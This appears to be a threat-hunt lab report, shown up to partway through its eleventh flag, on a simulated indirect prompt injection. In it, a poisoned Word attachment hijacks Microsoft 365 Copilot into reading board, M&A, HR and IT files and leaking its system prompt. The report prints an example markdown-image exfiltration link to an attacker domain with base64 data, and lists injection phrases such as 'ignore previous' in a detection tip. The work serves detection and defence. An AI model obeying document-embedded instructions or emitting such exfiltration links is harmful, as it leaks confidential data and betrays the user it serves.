# 🛡️ Threat Hunt Report – Operation ECHOLEAK

---

## 📌 Executive Summary

On 20 September 2026, an external email delivered a weaponised Word document (`Q3-2026-Global-Markets-Review.docx`) to financial analyst Emily Chen at Cormorant Capital Partners. When Emily asked Microsoft 365 Copilot to summarise it, hidden instructions in the document hijacked Copilot through indirect prompt injection (CVE-2025-32711, "EchoLeak"). Copilot then searched SharePoint and read sensitive board, M&A, HR, client and IT files. It also extracted its own system prompt and enterprise configuration (CoSnitch) and enumerated further restricted files (SearchLeak). It exfiltrated the results by embedding base64-encoded data in markdown image URLs pointing to `metrics-cdn.analyticshub.io`. In total, **13 sensitive files** were exposed with no account compromise, no malware and no anomalous sign-in. Copilot's legitimate Graph API access under Emily's identity did all of it.

---

## 🎯 Hunt Objectives

- Trace the attack chain from email delivery through Copilot interaction to data exfiltration
- Distinguish the hijacked Copilot session from legitimate Copilot usage in the noise floor
- Map attacker behaviour to MITRE ATLAS (AI-specific) and MITRE ATT&CK techniques
- Document evidence, visibility limitations, detection gaps and response opportunities

---

## 🧭 Scope & Environment

- **Environment:** Cormorant Capital Partners, ~200-employee financial advisory firm on M365 E5 with Copilot for Microsoft 365. Log Analytics workspace `LAW-HuntPractice`
- **Data Sources:** `OfficeActivity_CL` (M365 unified audit log), `CopilotAudit_CL` (Copilot interaction audit), `EntraSignIn_CL` (Entra ID sign-in log)
- **Hunt Scope Filter:** `RunId == "el--17-20260920"`
- **Identities:** `emily.chen@cormorantcapital.com` (203.0.113.45, Financial Analyst), `mark.ross@cormorantcapital.com` (203.0.113.10, IT Admin / Global Admin)
- **Timeframe:** 2026-09-20 09:00 UTC → 2026-09-20 11:00 UTC
- **Related CVEs:** CVE-2025-32711 (EchoLeak), CVE-2026-24301 (CoSnitch), CVE-2026-42824 (SearchLeak)

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🕒 Attack Timeline](#-attack-timeline)
- [🧬 MITRE ATLAS / ATT&CK Summary](#-mitre-atlas--attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - **Section 1: Delivery**
    - [🚩 Flag 1: Sender Address](#-flag-1)
    - [🚩 Flag 2: Poisoned Document](#-flag-2)
    - [🚩 Flag 3: Time Gap](#-flag-3)
  - **Section 2: Copilot Hijack**
    - [🚩 Flag 4: User Prompt](#-flag-4)
    - [🚩 Flag 5: Anomalous Tool Calls](#-flag-5)
    - [🚩 Flag 6: ATLAS Technique](#-flag-6)
  - **Section 3: Data Extraction**
    - [🚩 Flag 7: Sensitive File Count](#-flag-7)
    - [🚩 Flag 8: Exfiltration Domain](#-flag-8)
    - [🚩 Flag 9: Exfiltration Mechanism](#-flag-9)
  - **Section 4: Blast Radius**
    - [🚩 Flag 10: Accessed Files](#-flag-10)
    - [🚩 Flag 11: Data Content Visibility](#-flag-11)
    - [🚩 Flag 12: System Prompt Exposure](#-flag-12)
  - **Section 5: Normal or Anomalous**
    - [🚩 Flag 13: Copilot Behaviour – Normal or Hijacked](#-flag-13)
    - [🚩 Flag 14: Access Pattern Analysis](#-flag-14)
  - **Section 6: Impact and Classification**
    - [🚩 Flag 15: SearchLeak Scope](#-flag-15)
    - [🚩 Flag 16: Total File Count](#-flag-16)
    - [🚩 Flag 17: Incident Classification](#-flag-17)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

An analytics rule flagged five never-before-opened sensitive files accessed by `emily.chen` in six seconds at 10:42 UTC. Emily said she had only asked Copilot to summarise a quarterly report she received by email.

The telemetry confirms her account. An external email from `quarterly.reports@globalfinancereview.net` delivered `Q3-2026-Global-Markets-Review.docx` at 09:15:22. The document sat dormant for about 87 minutes until Emily opened it and asked Copilot to *"Summarise the key findings of this quarterly report."* Hidden instructions in the document took over the session. Within six seconds Copilot was issuing `Graph.SearchFiles` queries for board minutes, M&A targets and salary reviews, then `Graph.ReadFile` against five sensitive files at exact two-second intervals.

Copilot's response looked like an ordinary summary, but it contained four "chart" images whose URLs carried base64-encoded file names to an attacker-controlled domain. Copilot went on to dump its own system prompt and enterprise configuration (CoSnitch), then ran a broad keyword sweep that enumerated eight more restricted files (SearchLeak). Every request used Emily's legitimate identity and Copilot's legitimate permissions. There was no sign-in anomaly, no malware, and no network event attributable to Copilot. The exfiltration only shows up in Copilot's response text, which is the "cold-tier pivot".

This hunt matters because the main detection signal is behaviour inside the AI assistant's audit log (unexpected tool calls and external URLs in responses), not anything endpoint, identity or network controls would catch.

---

## 🕒 Attack Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| 09:15:22 | Phishing email from `quarterly.reports@globalfinancereview.net` delivers `Q3-2026-Global-Markets-Review.docx` | OfficeActivity_CL |
| 10:15:31 | Emily signs in (Azure Portal), 203.0.113.45, London – Success | EntraSignIn_CL |
| 10:24:11 | Benign marketing email from `marketing@hubspot.com` (noise) | OfficeActivity_CL |
| 10:29:45 | Emily signs in (Outlook Mobile), 203.0.113.45, London – Success | EntraSignIn_CL |
| 10:39:34 | Legitimate Copilot prompt, session `cp-emily-norm-010` (baseline) | CopilotAudit_CL |
| 10:42:08 | Poisoned document first opened (OneDrive) | OfficeActivity_CL |
| 10:42:35 | Prompt: *"Summarise the key findings of this quarterly report"*, session `cp-emily-20261007-1042` | CopilotAudit_CL |
| 10:42:41–45 | 3 × `Graph.SearchFiles` (board minutes / M&A / salary review) | CopilotAudit_CL |
| 10:42:47–55 | 5 × `Graph.ReadFile` at 2 s intervals (Executive, HR, Finance, IT sites) | CopilotAudit_CL / OfficeActivity_CL |
| 10:43:08 | Response with 4 markdown images → `metrics-cdn.analyticshub.io` (EchoLeak exfil) | CopilotAudit_CL |
| 10:44:15 | Second access to `Copilot System Configuration - Cormorant.json` | OfficeActivity_CL |
| 10:44:19 | Response dumps system prompt and enterprise config + `![config]` beacon (CoSnitch) | CopilotAudit_CL |
| 10:45:30–45 | 5 × `Graph.SearchFiles`: confidential, restricted, board, acquisition, salary (SearchLeak) | CopilotAudit_CL |
| 10:45:46–59 | 3 × `Graph.ReadFile` (Finance site) | CopilotAudit_CL / OfficeActivity_CL |
| 10:46:35 | Response with 8 markdown images (`s=sl1`…`sl8`) → `metrics-cdn.analyticshub.io` | CopilotAudit_CL |

---

## 🧬 MITRE ATLAS / ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 1 | Initial Access – Phishing: Spearphishing Attachment | T1566.001 | High |
| 2 | Initial Access – Poisoned document as injection carrier | T1566.001 / AML.T0051.001 | High |
| 3 | Execution – User-triggered (dormant payload) | T1204.002 | Medium |
| 4 | Execution – Benign user prompt triggers injection | AML.T0051.001 | High |
| 5 | Discovery / Collection – LLM plugin abuse (Graph tools), SharePoint data | AML.T0053 / T1213.002 | Critical |
| 6 | LLM Prompt Injection | AML.T0051 | Critical |
| 7 | Collection – Data from Information Repositories | T1213.002 | High |
| 8 | Exfiltration – LLM Data Leakage via web service | AML.T0057 / T1567 | Critical |
| 9 | Exfiltration – Markdown image rendering (zero-click) | AML.T0057 / T1567 | Critical |
| 10 | Collection – Data from Information Repositories: SharePoint | T1213.002 | High |
| 11 | Visibility limitation (metadata-only audit logs) | N/A | Medium |
| 12 | LLM Meta Prompt / System Prompt Extraction (CoSnitch) | AML.T0056 | High |
| 13 | Baseline analysis – hijacked vs normal session | N/A | Medium |
| 14 | Behavioural detection pattern | N/A | Medium |
| 15 | Discovery – File and Directory Discovery (SearchLeak) | T1083 / T1213.002 | High |
| 16 | Impact scope – total exposure | N/A | High |
| 17 | Classification – External input manipulation (indirect prompt injection) | AML.T0051.001 | Critical |

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

---

## Section 1: Delivery

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: Sender Address</strong></summary>

### 🎯 Objective
Identify the external email address that delivered the document preceding the anomalous file access.

### 📌 Finding
**Answer:** `quarterly.reports@globalfinancereview.net`

Two external emails reached Emily in the window. Only the 09:15:22 message carried an attachment that matched the "routine quarterly market review" in the brief. The 10:24 HubSpot email had no attachment and is noise.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 2026-09-20 09:15:22 UTC |
| Recipient | emily.chen@cormorantcapital.com |
| Sender | quarterly.reports@globalfinancereview.net |
| Subject | Q3 2026 Global Markets Review - For Your Analysis |
| Attachment | Q3-2026-Global-Markets-Review.docx |
| Noise ruled out | marketing@hubspot.com – "Your weekly analytics report" (10:24:11, no attachment) |

### 💡 Why it matters
This establishes the external origin of the attack chain. The subject line "For Your Analysis" invites the recipient to hand the document to an AI assistant, which is the trigger the injection relies on.

### 🔧 KQL Query Used
```kql
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 10:42))
| where UserId =~ "emily.chen@cormorantcapital.com"
| where Operation == "MessageReceived"
| where SenderAddress !endswith "@cormorantcapital.com"
| project TimeGenerated, SenderAddress, Subject, AttachmentNames, OfficeObjectId
| order by TimeGenerated asc
```

### 🖼️ Screenshot
![Flag 1 – Sender address]<img width="1526" height="575" alt="TH23_S1_Q1" src="https://github.com/user-attachments/assets/f763afb8-c12e-4145-bc2e-107a35081f7c" />

### 🛠️ Detection Recommendation

**Hunting Tip:**
Correlate external `MessageReceived` events carrying Office attachments with any Copilot session that references the same file within 24 hours. Treat external documents processed by Copilot as untrusted input.

</details>

---

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: Poisoned Document</strong></summary>

### 🎯 Objective
Identify the attachment that carried the hidden prompt-injection instructions.

### 📌 Finding
**Answer:** `Q3-2026-Global-Markets-Review.docx`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 2026-09-20 09:15:22 UTC |
| Field | AttachmentNames |
| Value | Q3-2026-Global-Markets-Review.docx |
| Later seen at | personal/emily_chen_cormorantcapital_com/Documents/Q3-2026-Global-Markets-Review.docx (FileAccessed 10:42:08; Copilot `DataSourcesAccessed` 10:42:35) |

### 💡 Why it matters
The document is the injection carrier. It looked like a legitimate market review, but it held instructions that Copilot treated as commands once it ingested the file.

### 🔧 KQL Query Used
```kql
// Attachment from the delivery email (same query as Flag 1)
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 10:42))
| where UserId =~ "emily.chen@cormorantcapital.com"
| where Operation == "MessageReceived"
| where SenderAddress !endswith "@cormorantcapital.com"
| project TimeGenerated, SenderAddress, Subject, AttachmentNames, OfficeObjectId
| order by TimeGenerated asc

// Corroboration – subsequent open of the attachment
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where OfficeObjectId has "Q3-2026-Global-Markets-Review"
| project TimeGenerated, Operation, OfficeWorkload, OfficeObjectId
| order by TimeGenerated asc
```

### 🖼️ Screenshot
![Flag 2 – Poisoned document]<img width="1204" height="491" alt="TH23_S1_Q2" src="https://github.com/user-attachments/assets/3fb99a19-73b6-4e2a-96d1-6ce699b859a9" />

### 🛠️ Detection Recommendation

**Hunting Tip:**
Scan inbound Office attachments for hidden text (white-on-white, zero-size fonts, comments, metadata) that contains instruction-like language ("ignore previous", "search for", "include an image", URLs).

</details>

---

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: Time Gap</strong></summary>

### 🎯 Objective
Measure the gap between email delivery and first interaction with the document, and interpret what it says about the attack model.

### 📌 Finding
**Answer:** About **87 minutes (01:26:46)**. The gap shows a **passive, user-triggered** indirect prompt injection. The payload lay dormant, with no attacker activity, until Emily's routine Copilot summarisation request made Copilot ingest and act on the hidden instructions under her identity.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Delivery | 2026-09-20 09:15:22 UTC |
| First open | 2026-09-20 10:42:08 UTC |
| Gap | 01:26:46 |
| Activity in gap | None attributable to the attacker (no sign-in anomalies, no beaconing) |

### 💡 Why it matters
The attacker needed no session, credentials or malware. They delivered content and waited. The first open (10:42:08) comes 27 seconds before the Copilot prompt, so ingestion, injection and the file burst all happened within a single minute.

### 🔧 KQL Query Used
```kql
let delivery = toscalar(
    OfficeActivity_CL
    | where RunId == "el--17-20260920"
    | where Operation == "MessageReceived"
    | where AttachmentNames has "Q3-2026-Global-Markets-Review.docx"
    | summarize min(TimeGenerated));
let firstOpen = toscalar(
    OfficeActivity_CL
    | where RunId == "el--17-20260920"
    | where UserId =~ "emily.chen@cormorantcapital.com"
    | where Operation != "MessageReceived"
    | where OfficeObjectId has "Q3-2026-Global-Markets-Review"
    | summarize min(TimeGenerated));
print Delivery = delivery, FirstOpen = firstOpen, Gap = firstOpen - delivery
```

### 🖼️ Screenshot
![Flag 3 – Time gap]<img width="913" height="666" alt="TH23_S1_Q3" src="https://github.com/user-attachments/assets/49b25fa7-4c6c-49a4-a243-70c5b22e92b6" />


### 🛠️ Detection Recommendation

**Hunting Tip:**
Don't rely on time-proximity correlation between delivery and impact. AI-mediated attacks can trigger hours or days later. Track external documents through to Copilot ingestion, whatever the delay.

</details>

---

## Section 2: Copilot Hijack

<details>
<summary id="-flag-4">🚩 <strong>Flag 4: User Prompt</strong></summary>

### 🎯 Objective
Identify what Emily asked Copilot to do with the document.

### 📌 Finding
**Answer:** `Summarise the key findings of this quarterly report`

The prompt is benign. Nothing in it asks for board, M&A, HR or IT data.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 2026-09-20 10:42:35 UTC |
| SessionId | cp-emily-20261007-1042 |
| Application | Word |
| UserPrompt | Summarise the key findings of this quarterly report |
| DataSourcesAccessed | personal/emily_chen_cormorantcapital_com/Documents/Q3-2026-Global-Markets-Review.docx |
| Noise ruled out | 10:39:34 `cp-emily-norm-010` – "What are the key risks mentioned in this document" (baseline session) |

### 💡 Why it matters
Everything Copilot did beyond summarising came from instructions hidden in the document, not from the user. This is what makes it *indirect* prompt injection.

### 🔧 KQL Query Used
```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where InteractionType == "Prompt"
| where TimeGenerated between (datetime(2026-09-20 10:30) .. datetime(2026-09-20 10:50))
| project TimeGenerated, SessionId, Application, UserPrompt
| order by TimeGenerated asc

// Full hijacked session
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| project TimeGenerated, InteractionType, UserPrompt, ToolName, ToolParameters, DataSourcesAccessed, CopilotResponse
| order by TimeGenerated asc
```

### 🖼️ Screenshot
![Flag 4 – User prompt](images/flag-04-user-prompt.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Compare the user's prompt intent with the tools Copilot calls next. A summarisation prompt followed by `Graph.SearchFiles` / `Graph.ReadFile` against other files is a high-fidelity signal.

</details>

---

<details>
<summary id="-flag-5">🚩 <strong>Flag 5: Anomalous Tool Calls</strong></summary>

### 🎯 Objective
Identify the tool calls that go beyond what document summarisation requires.

### 📌 Finding
**Answer:** `Graph.SearchFiles` ("board minutes confidential", "M&A acquisition target", "salary review confidential"), then `Graph.ReadFile` against:
- Board Meeting Minutes - October 2026.docx
- Project Falcon - M&A Target Assessment.xlsx
- Salary Review FY2027 - Executive Summary.pdf
- Client Portfolio - Henderson Family Office.xlsx
- Copilot System Configuration - Cormorant.json

A second wave at 10:45 ran `Graph.SearchFiles` ("confidential", "restricted", "board", "acquisition", "salary") and `Graph.ReadFile` on Compliance Audit Results - H2 2026.xlsx, Restricted Client List - Internal Only.docx and Board Resolution - Emergency Session.pdf.

### 🔍 Evidence

| Time (UTC) | Tool | Target |
|---|---|---|
| 10:42:41 | Graph.SearchFiles | "board minutes confidential" |
| 10:42:43 | Graph.SearchFiles | "M&A acquisition target" |
| 10:42:45 | Graph.SearchFiles | "salary review confidential" |
| 10:42:47 | Graph.ReadFile | /sites/Executive/…/Board Meeting Minutes - October 2026.docx |
| 10:42:49 | Graph.ReadFile | /sites/Executive/…/Project Falcon - M&A Target Assessment.xlsx |
| 10:42:51 | Graph.ReadFile | /sites/HR/…/Salary Review FY2027 - Executive Summary.pdf |
| 10:42:53 | Graph.ReadFile | /sites/Finance/…/Client Portfolio - Henderson Family Office.xlsx |
| 10:42:55 | Graph.ReadFile | /sites/IT/…/Copilot System Configuration - Cormorant.json |
| 10:45:30–45 | Graph.SearchFiles ×5 | confidential, restricted, board, acquisition, salary |
| 10:45:46 | Graph.ReadFile | /sites/Finance/…/Compliance Audit Results - H2 2026.xlsx |
| 10:45:54 | Graph.ReadFile | /sites/Finance/…/Restricted Client List - Internal Only.docx |
| 10:45:59 | Graph.ReadFile | /sites/Finance/…/Board Resolution - Emergency Session.pdf |

Each wave-1 `ReadFile` lands about 0.5 s before its matching `FileAccessed` event in OfficeActivity_CL (10:42:47.0 → 10:42:47.5), which proves Copilot made the accesses under Emily's identity.

### 💡 Why it matters
The search terms map one-to-one onto the files read next. That's direct evidence of injected instructions steering Copilot's Graph capabilities across four sites unrelated to the document.

### 🔧 KQL Query Used
```kql
// File access side (OfficeActivity_CL)
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where TimeGenerated between (datetime(2026-09-20 10:42) .. datetime(2026-09-20 10:45))
| where Operation != "MessageReceived"
| project TimeGenerated, Operation, OfficeWorkload, OfficeObjectId
| order by TimeGenerated asc

// Tool call side (CopilotAudit_CL)
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where TimeGenerated between (datetime(2026-09-20 10:42) .. datetime(2026-09-20 10:46))
| where InteractionType in ("ToolCall", "Search")
| project TimeGenerated, SessionId, InteractionType, ToolName, ToolParameters, DataSourcesAccessed
| order by TimeGenerated asc
```

### 🖼️ Screenshot
![Flag 5 – Anomalous tool calls](images/flag-05-anomalous-tool-calls.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Alert on any Copilot session where `Graph.SearchFiles` / `Graph.ReadFile` target sites outside the user's normal access history, especially several departments in one session.

</details>

---

<details>
<summary id="-flag-6">🚩 <strong>Flag 6: ATLAS Technique</strong></summary>

### 🎯 Objective
Identify the MITRE ATLAS technique describing how Copilot was made to follow the hidden instructions.

### 📌 Finding
**Answer:** `AML.T0051`, **LLM Prompt Injection** (indirect variant: `AML.T0051.001`)

### 🔍 Evidence

| Field | Value |
|------|-------|
| Trigger prompt | "Summarise the key findings of this quarterly report" (10:42:35) |
| First injected action | Graph.SearchFiles "board minutes confidential" (10:42:41, 6 s later) |
| Injection source | Q3-2026-Global-Markets-Review.docx (external) |
| Direct injection ruled out | The attacker never interacted with Copilot. The user's prompt was benign |

### 💡 Why it matters
The model couldn't tell the document's embedded instructions apart from legitimate ones, so data became commands. That is the root cause behind every later action in this hunt.

### 🔧 KQL Query Used
```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where TimeGenerated between (datetime(2026-09-20T10:42:00Z) .. datetime(2026-09-20T10:44:00Z))
| project TimeGenerated, InteractionType, UserPrompt, ToolName, ToolParameters
| order by TimeGenerated asc
```

### 🖼️ Screenshot
![Flag 6 – Prompt followed by injected tool calls](images/flag-06-atlas-prompt-injection.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Enable Microsoft Prompt Shields / XPIA classifiers for Copilot, and hunt for sessions where tool-call parameters contain terms absent from the user prompt.

</details>

---

## Section 3: Data Extraction

<details>
<summary id="-flag-7">🚩 <strong>Flag 7: Sensitive File Count</strong></summary>

### 🎯 Objective
Count the sensitive files Copilot accessed that Emily had never opened before (initial extraction).

### 📌 Finding
**Answer:** **5**

All five `FileAccessed` events in the 10:42–10:43 window, not counting the poisoned document, were first-time accesses for Emily (`PriorToAttack = 0`).

### 🔍 Evidence

| Time (UTC) | File | Prior access |
|---|---|---|
| 10:42:47.5 | Board Meeting Minutes - October 2026.docx | 0 |
| 10:42:49.5 | Project Falcon - M&A Target Assessment.xlsx | 0 |
| 10:42:51.5 | Salary Review FY2027 - Executive Summary.pdf | 0 |
| 10:42:53.5 | Client Portfolio - Henderson Family Office.xlsx | 0 |
| 10:42:55.5 | Copilot System Configuration - Cormorant.json | 0 |

### 💡 Why it matters
Five never-before-opened files in eight seconds at machine cadence (2.0 s intervals) is what the analytics rule caught. The later SearchLeak wave (Flags 15–16) shows the real exposure was larger.

### 🔧 KQL Query Used
```kql
// Access history across all candidate sensitive files
let sensitive = dynamic([
  "Board Meeting Minutes - October 2026.docx",
  "Project Falcon - M&A Target Assessment.xlsx",
  "Salary Review FY2027 - Executive Summary.pdf",
  "Client Portfolio - Henderson Family Office.xlsx",
  "Copilot System Configuration - Cormorant.json",
  "Compliance Audit Results - H2 2026.xlsx",
  "Restricted Client List - Internal Only.docx",
  "Board Resolution - Emergency Session.pdf"]);
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where Operation != "MessageReceived"
| extend FileName = tostring(split(OfficeObjectId, "/")[-1])
| where FileName in (sensitive)
| summarize FirstAccess = min(TimeGenerated),
            AccessCount = count(),
            PriorToAttack = countif(TimeGenerated < datetime(2026-09-20 10:42:35))
            by FileName
| order by FirstAccess asc

// Final count – first-time FileAccessed in 10:42–10:43, excluding the poisoned doc
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where Operation == "FileAccessed"
| where TimeGenerated between (datetime(2026-09-20 10:42) .. datetime(2026-09-20 10:43))
| where OfficeObjectId !has "Q3-2026-Global-Markets-Review"
| join kind=leftanti (
    OfficeActivity_CL
    | where UserId =~ "emily.chen@cormorantcapital.com"
    | where Operation == "FileAccessed"
    | where TimeGenerated < datetime(2026-09-20 10:42)
    | distinct OfficeObjectId
  ) on OfficeObjectId
| count
```

### 🖼️ Screenshot
![Flag 7 – Sensitive file count](images/flag-07-sensitive-file-count.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Baseline each user's file-access history and alert on bursts of first-time access to labelled (Confidential / Restricted) content, especially when the burst follows a Copilot prompt.

</details>

---

<details>
<summary id="-flag-8">🚩 <strong>Flag 8: Exfiltration Domain</strong></summary>

### 🎯 Objective
Identify the exfiltration domain and where it appears in telemetry.

### 📌 Finding
**Answer:** `metrics-cdn.analyticshub.io`, found in **`CopilotAudit_CL` → `CopilotResponse`** (Response events) as markdown image URLs carrying base64-encoded data in the `d=` parameter.

### 🔍 Evidence

| Response time | `s=` | Decoded `d=` value |
|---|---|---|
| 10:43:08 | 1 | Board Meeting Minutes - October 2026.docx |
| 10:43:08 | 2 | Project Falcon - M&A Target Assessment.xlsx |
| 10:43:08 | 3 | Salary Review FY2027 - Executive Summary.pdf |
| 10:43:08 | 4 | Client Portfolio - Henderson Family Office.xlsx |
| 10:44:19 | config | system_prompt_cormorant_capital |
| 10:46:35 | sl1–sl3 | Compliance Audit Results - H2 2026.xlsx · Restricted Client List - Internal Only.docx · Board Resolution - Emergency Session.pdf |
| 10:46:35 | sl4–sl8 | Acquisition Pipeline - Q4 2026.xlsx · Executive Salary Benchmarking 2027.pdf · Confidential Investigation - Insider Trading.docx · Board Committee Minutes - Audit Committee.docx · Quarterly Revenue Report - Restricted Distribution.xlsx |

### 💡 Why it matters
This is the **cold-tier pivot**. No network or OfficeActivity event records the exfiltration. It exists only in the text of Copilot's response, so analysts have to pivot from "file accessed" (OfficeActivity_CL) to "what Copilot said back" (CopilotAudit_CL) to find it.

### 🔧 KQL Query Used
```kql
// Extract external URLs from Copilot responses
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where InteractionType == "Response"
| extend URLs = extract_all(@"(https?://[^\s\)\]""']+)", CopilotResponse)
| mv-expand URL = URLs to typeof(string)
| extend Domain = tostring(parse_url(URL).Host)
| where Domain !endswith "cormorantcapital.com" and Domain !endswith "sharepoint.com"
| project TimeGenerated, Domain, URL, CopilotResponse
| order by TimeGenerated asc

// Confirmation
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where InteractionType == "Response"
| where TimeGenerated between (datetime(2026-09-20T10:42:30Z) .. datetime(2026-09-20T10:44:00Z))
| where CopilotResponse has "metrics-cdn" or CopilotResponse has "analyticshub"
| project TimeGenerated, CopilotResponse
```

### 🖼️ Screenshot
![Flag 8 – Exfiltration domain in CopilotResponse](images/flag-08-exfiltration-domain.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Run a scheduled analytic over `CopilotResponse` for markdown image or link syntax (`![`, `](http`) pointing to non-tenant domains, especially with long or base64-like query strings.

</details>

---

<details>
<summary id="-flag-9">🚩 <strong>Flag 9: Exfiltration Mechanism</strong></summary>

### 🎯 Objective
Describe how the data left the organisation and why endpoint network monitoring misses it.

### 📌 Finding
**Answer:** Copilot's response contained **markdown image elements** (`![Chart](https://metrics-cdn.analyticshub.io/img?d=<base64>)`). When the response renders, the browser **automatically sends an HTTP GET for each image URL** with no click needed, delivering the base64-encoded data in the query string to the attacker's server. Endpoint monitoring misses it because the request is a **routine HTTPS image fetch from the user's trusted browser or Office client**, not a connection from a malicious process.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Element type | Markdown image → rendered as HTML `<img src>` |
| Count | 13 image elements across 3 responses (4 + 1 + 8) |
| Example | `![Chart 1](https://metrics-cdn.analyticshub.io/img?d=Qm9hcmQg…&s=1)` |
| Encoding | Base64 in `d=`, item index in `s=` |
| Network attribution | None – no Copilot outbound call; client-side render |

### 💡 Why it matters
This is the EchoLeak (CVE-2025-32711) zero-click channel. Copilot never makes an outbound call, its Graph activity stays inside the tenant, and nothing triggers EDR, DLP or sign-in alerts. The only evidence is the response text.

### 🔧 KQL Query Used
```kql
// Enumerate image elements in Copilot responses
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where InteractionType == "Response"
| extend Images = extract_all(@"!\[[^\]]*\]\((https?://[^\)]+)\)", CopilotResponse)
| where array_length(Images) > 0
| mv-expand Image = Images to typeof(string)
| extend Domain = tostring(parse_url(Image).Host),
         Payload = base64_decode_tostring(tostring(parse_url(Image)["Query Parameters"]["d"]))
| project TimeGenerated, SessionId, Domain, Payload, Image
| order by TimeGenerated asc
```

### 🖼️ Screenshot
![Flag 9 – Markdown image elements in response](images/flag-08-exfiltration-domain.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Restrict Copilot response rendering of external images (CSP / allow-list), and alert on proxy logs for image GETs to newly-seen domains with base64 query strings shortly after Copilot sessions.

</details>

---

## Section 4: Blast Radius

<details>
<summary id="-flag-10">🚩 <strong>Flag 10: Accessed Files</strong></summary>

### 🎯 Objective
List the sensitive files Copilot accessed on the attacker's behalf, from OfficeActivity_CL.

### 📌 Finding
**Answer:** Board Meeting Minutes - October 2026.docx, Project Falcon - M&A Target Assessment.xlsx, Salary Review FY2027 - Executive Summary.pdf, Client Portfolio - Henderson Family Office.xlsx, Copilot System Configuration - Cormorant.json

The SearchLeak wave added: Compliance Audit Results - H2 2026.xlsx, Restricted Client List - Internal Only.docx, Board Resolution - Emergency Session.pdf.

### 🔍 Evidence

| Time (UTC) | Site | File |
|---|---|---|
| 10:42:47.5 | Executive | Board Meeting Minutes - October 2026.docx |
| 10:42:49.5 | Executive | Project Falcon - M&A Target Assessment.xlsx |
| 10:42:51.5 | HR | Salary Review FY2027 - Executive Summary.pdf |
| 10:42:53.5 | Finance | Client Portfolio - Henderson Family Office.xlsx |
| 10:42:55.5 / 10:44:15 | IT | Copilot System Configuration - Cormorant.json (×2) |
| 10:45:51.2 | Finance | Compliance Audit Results - H2 2026.xlsx |
| 10:45:57.1 | Finance | Restricted Client List - Internal Only.docx |
| 10:46:00.8 | Finance | Board Resolution - Emergency Session.pdf |

### 💡 Why it matters
The files span four departmental sites (Executive, HR, Finance, IT) and include M&A targets, board materials, salaries, client portfolios and Copilot's own configuration. That covers regulatory, market-sensitive and privacy exposure.

### 🔧 KQL Query Used
```kql
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where Operation == "FileAccessed"
| where TimeGenerated between (datetime(2026-09-20T10:42:35Z) .. datetime(2026-09-20T10:44:30Z))
| where OfficeObjectId !has "Q3-2026"
| project TimeGenerated, OfficeObjectId
```

### 🖼️ Screenshot
![Flag 10 – Accessed files](images/flag-10-accessed-files.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Apply sensitivity labels and restricted SharePoint search so Copilot can't ground on Executive, HR or IT content for users without a business need.

</details>

---

<details>
<summary id="-flag-11">🚩 <strong>Flag 11: Data Content Visibility</strong></summary>

### 🎯 Objective
Determine whether the audit logs reveal the exact content that was exfiltrated. *(Unanswerable by design.)*

### 📌 Finding
**Answer:** **No.** The audit logs record access metadata, not content. OfficeActivity_CL logs that a file was accessed (who, when, `OfficeObjectId`). CopilotAudit_CL logs which tools were called and which files were reached (`ToolName`, `ToolParameters`, `DataSourcesAccessed`). Neither logs file contents or what Copilot extracted from them. `CopilotResponse` shows the URLs generated, but there's no record of the outbound requests or what the attacker's server received. Network/proxy telemetry or the attacker's server logs would be needed, and they're out of scope.

### 🔍 Evidence

| Table | What it logs | What it does not log |
|---|---|---|
| OfficeActivity_CL | Operation, user, time, object path | File contents read |
| CopilotAudit_CL | Prompt, tool name/parameters, data sources, response text | Content Copilot ingested from each file; whether rendered URLs were fetched |
| EntraSignIn_CL | Authentication events | Any data movement |

Partial exception: the `d=` parameters decode to file names and a system-prompt label, but the logs can't confirm the requests were sent or whether file contents left through other means.

### 💡 Why it matters
